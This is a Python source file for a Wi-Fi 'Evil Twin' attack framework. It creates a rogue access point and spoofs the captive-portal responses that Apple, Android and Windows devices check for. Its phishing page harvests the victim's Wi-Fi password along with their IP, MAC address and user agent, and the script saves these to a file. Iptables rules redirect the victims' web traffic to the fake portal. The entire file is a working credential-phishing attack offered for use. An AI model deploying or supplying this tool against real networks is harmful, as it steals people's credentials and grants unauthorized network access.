#!/usr/bin/env python3

import re
import os
import sys
import time
import json
import argparse
import threading
import subprocess

from colorama import Fore, Style
from utilities.arts import banner
from http.server import BaseHTTPRequestHandler, HTTPServer
from utilities.helpers import notify_password_captured, clear_screen
from utilities.configurations import configure_dnsmasq, configure_hostapd
from utilities.services import setup_interface, stop_network_services, enable_ip_forwarding, monitor_clients

PASSWORD_CAPTURED = False
CAPTURED_CREDENTIALS = {}
PHISHING_PORT = 80


class LightweightHTTPHandler(BaseHTTPRequestHandler):
    def log_request(self, code='-', size='-'):
        """Enhanced request logging with more details"""
        client_ip = self.client_address[0]
        timestamp = time.strftime("%d/%b/%Y %H:%M:%S")
        method = self.command
        path = self.path
        protocol = self.request_version
        user_agent = self.headers.get('User-Agent', '-')

        # Try to get MAC address if possible
        try:
            mac = self.get_client_mac()
        except:
            mac = "unknown"

        log_line = f"\n{client_ip} ({mac}) - - [{timestamp}] \"{method} {path} {protocol}\" {code} \"{user_agent}\""
        print(log_line)

        # Also write to a log file
        with open(f"{args.ssid}.log", "a") as log_file:
            log_file.write(log_line + "\n")

    def get_client_mac(self):
        """Attempt to get client MAC address from ARP table"""
        client_ip = self.client_address[0]
        try:
            # Check ARP table for the IP
            arp_output = subprocess.check_output(["arp", "-n", client_ip], stderr=subprocess.DEVNULL).decode()
            if "no entry" not in arp_output.lower():
                mac = re.search(r"(([0-9a-fA-F]{2}[:-]){5}([0-9a-fA-F]{2}))", arp_output)
                if mac:
                    return mac.group(0)
        except:
            pass
        return "unknown"

    def do_GET(self):
        """Handle GET requests with enhanced logging"""
        # Log the initial request
        self.log_request()

        # Apple Captive Portal Detection Endpoints
        apple_captive_urls = {
            "/generate_204": "http://192.168.1.1/",  # Android/Chrome also uses this
            "/hotspot-detect.html": "http://192.168.1.1/",
            "/library/test/success.html": "http://192.168.1.1/",
            "/ncsi.txt": "http://192.168.1.1/",
            "/connectivity-check.html": "http://192.168.1.1/",
            "/captiveportal": "http://192.168.1.1/"
        }

        # Special handling for captive portal detection
        if self.path in apple_captive_urls:
            # For Apple devices, we need to return specific responses
            if "CaptiveNetworkSupport" in self.headers.get('User-Agent', ''):
                # iPhone/iPad specific handling
                if self.path == "/hotspot-detect.html":
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(b"<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>")
                elif self.path == "/generate_204":
                    self.send_response(204)  # Must return actual 204 for iOS
                    self.end_headers()
                else:
                    self.send_response(302)
                    self.send_header("Location", apple_captive_urls[self.path])
                    self.end_headers()
            else:
                # For other devices using these endpoints
                self.send_response(302)
                self.send_header("Location", apple_captive_urls[self.path])
                self.end_headers()
            self.log_request(302 if self.path != "/generate_204" else 204)
            return

        # Serve phishing page
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

            with open("phishing_templates/index.html", "r") as f:
                content = f.read().replace("{ssid}", args.ssid)
            self.wfile.write(content.encode())
            self.log_request(200)  # Log the successful response
            return

        # Success page after password submission
        if self.path == "/success":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("phishing_templates/success.html", "rb") as f:
                self.wfile.write(f.read())
            self.log_request(200)
            return

        # Serve static files
        if self.path.endswith(".css") or self.path.endswith(".js") or self.path.endswith((".png", ".jpg", ".ico")):
            try:
                filepath = os.path.join("phishing_templates", self.path[1:])
                with open(filepath, "rb") as f:
                    self.send_response(200)
                    if self.path.endswith(".css"):
                        self.send_header("Content-type", "text/css")
                    elif self.path.endswith(".js"):
                        self.send_header("Content-type", "application/javascript")
                    elif self.path.endswith(".png"):
                        self.send_header("Content-type", "image/png")
                    elif self.path.endswith(".jpg"):
                        self.send_header("Content-type", "image/jpeg")
                    elif self.path.endswith(".ico"):
                        self.send_header("Content-type", "image/x-icon")
                    self.end_headers()
                    self.wfile.write(f.read())
                self.log_request(200)
                return
            except IOError:
                self.send_error(404)
                self.log_request(404)
                return

        # Redirect everything else to the phishing page
        self.send_response(302)
        self.send_header("Location", "http://192.168.1.1/")
        self.end_headers()
        self.log_request(302)

    def do_POST(self):
        """Handle POST requests with robust error handling"""
        try:
            # Safely get content length with fallback
            content_length = self.headers.get('Content-Length')
            if content_length is None:
                self.log_message("Warning: POST request missing Content-Length header")
                content_length = 0
            else:
                content_length = int(content_length)

            # Log the POST request
            self.log_request(size=content_length)

            if self.path == "/login":
                # Read POST data only if content_length > 0
                post_data = ""
                if content_length > 0:
                    post_data = self.rfile.read(content_length).decode('utf-8', errors='replace')

                # Extract password with error handling
                password_match = re.search(r"password=([^&]+)", post_data)
                if not password_match:
                    self.send_error(400, "Missing password parameter")
                    self.log_request(400)
                    return

                password = password_match.group(1)

                # Get client MAC address
                try:
                    mac = self.get_client_mac()
                except Exception as e:
                    mac = "unknown"
                    self.log_message(f"Could not get MAC address: {str(e)}")

                # Store captured credentials
                global PASSWORD_CAPTURED, CAPTURED_CREDENTIALS
                PASSWORD_CAPTURED = True
                CAPTURED_CREDENTIALS = {
                    "ssid": args.ssid,
                    "password": password,
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "client_ip": self.client_address[0],
                    "user_agent": self.headers.get('User-Agent', 'unknown'),
                    "mac_address": mac,
                    "post_data": post_data  # For debugging purposes
                }

                # Save credentials
                os.makedirs("credentials", exist_ok=True)
                with open("credentials/Wi-Fi_credentials.flag", "w") as f:
                    json.dump(CAPTURED_CREDENTIALS, f, indent=2)

                notify_password_captured(CAPTURED_CREDENTIALS)

                # Redirect to success page
                self.send_response(302)
                self.send_header("Location", "http://192.168.1.1/success")
                self.end_headers()
                self.log_request(302)

            else:
                self.send_error(404, "Not Found")
                self.log_request(404)

        except Exception as e:
            self.log_message(f"Error processing POST request: {str(e)}")
            self.send_error(500, "Internal Server Error")
            self.log_request(500)


def start_services(interface):
    try:
        dnsmasq = subprocess.Popen(["dnsmasq", "-C", "settings/dnsmasq.conf"])
        print("[✔] Started dnsmasq service")

        hostapd = subprocess.Popen(["hostapd", "settings/hostapd.conf", "-B"])
        print("[✔] Started hostapd service")

        server = HTTPServer(("192.168.1.1", PHISHING_PORT), LightweightHTTPHandler)
        print(f"[+] Phishing server running on port {PHISHING_PORT}")

        monitor_thread = threading.Thread(target=monitor_clients, args=(interface,))
        monitor_thread.daemon = True
        monitor_thread.start()

        # Clear existing rules
        subprocess.run(["iptables", "-t", "nat", "-F"], check=True)

        # Only redirect HTTP traffic (port 80)
        subprocess.run([
            "iptables", "-t", "nat", "-A", "PREROUTING",
            "-p", "tcp", "--dport", "80",
            "-j", "DNAT", "--to-destination", "192.168.1.1:80"
        ])

        # Allow established connections
        subprocess.run([
            "iptables", "-A", "FORWARD",
            "-m", "state", "--state", "ESTABLISHED,RELATED",
            "-j", "ACCEPT"
        ])

        # Block all others forwarded traffic
        subprocess.run(["iptables", "-A", "FORWARD", "-j", "DROP"])

        # Masquerade only HTTP traffic
        subprocess.run([
            "iptables", "-t", "nat", "-A", "POSTROUTING",
            "-p", "tcp", "--sport", "80",
            "-j", "MASQUERADE"
        ])

        # print("[+] iptables rules configured for HTTP-only traffic")
        return dnsmasq, hostapd, server
    except Exception as e:
        print(f"[-] Error starting services: {e}")
        sys.exit(1)


def cleanup(interface, processes):
    print("\n[!] Cleaning up...")
    try:
        # Terminate all running processes
        for p in processes:
            if p and p.poll() is None:
                p.terminate()
                try:
                    p.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    p.kill()

        # Ensure services are stopped
        subprocess.run(["pkill", "-9", "dnsmasq"], stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "-9", "hostapd"], stderr=subprocess.DEVNULL)

        # Reset iptables
        subprocess.run(["iptables", "-t", "nat", "-F"], check=True)
        subprocess.run(["iptables", "-t", "nat", "-X"], check=True)

        # Reset interface
        subprocess.run(["ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["iw", "dev", interface, "set", "type", "managed"], check=True)
        subprocess.run(["ip", "link", "set", interface, "up"], check=True)

        # Restart network services
        subprocess.run(["systemctl", "start", "NetworkManager"], check=True)
        subprocess.run(["systemctl", "start", "wpa_supplicant"], check=True)

        # Save captured credentials if any
        if PASSWORD_CAPTURED:
            print("\n[+] Wi-Fi credentials captured!")
            print(json.dumps(CAPTURED_CREDENTIALS, indent=2))
            with open("credentials/Wi-Fi_credentials.flag", "w") as f:
                json.dump(CAPTURED_CREDENTIALS, f)
            print(
                Fore.GREEN + Style.BRIGHT + "  ==> Credentials saved to /credentials/Wi-Fi_credentials.flag" +
                Style.RESET_ALL)

        print("[✔] Cleanup complete\n")
    except subprocess.CalledProcessError as e:
        print(f"[-] Command failed during cleanup: {e}")
    except Exception as e:
        print(f"[-] Unexpected error during cleanup: {e}")
    finally:
        for p in processes:
            if p and p.poll() is None:
                p.kill()


def main():
    global args
    parser = argparse.ArgumentParser(description="Wi-Fi Evil Twin attack framework by Saher Muhamed v1.0.0")
    parser.add_argument("-s", "--ssid", required=True, help="SSID for the fake AP (name of the fake access point)")
    parser.add_argument("-c", "--channel", type=int, required=True, help="Channel number (1-11)")
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface that support AP mode")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[!] Please run the script as root")
        sys.exit(1)

    clear_screen()
    banner()
    stop_network_services()
    enable_ip_forwarding()
    setup_interface(args.interface)
    configure_dnsmasq(args.interface)
    configure_hostapd(args.ssid, args.channel, args.interface)

    processes = []
    try:
        dnsmasq, hostapd, server = start_services(args.interface)
        processes.extend([dnsmasq, hostapd])

        print(f"\n[+] Fake access point '{args.ssid}' running on channel {args.channel}")
        print("[+] Waiting for clients to connect...")

        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()

        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        cleanup(args.interface, processes)
    except Exception as e:
        print(f"[-] Error: {e}")
        cleanup(args.interface, processes)
        sys.exit(1)


if __name__ == "__main__":
    main()
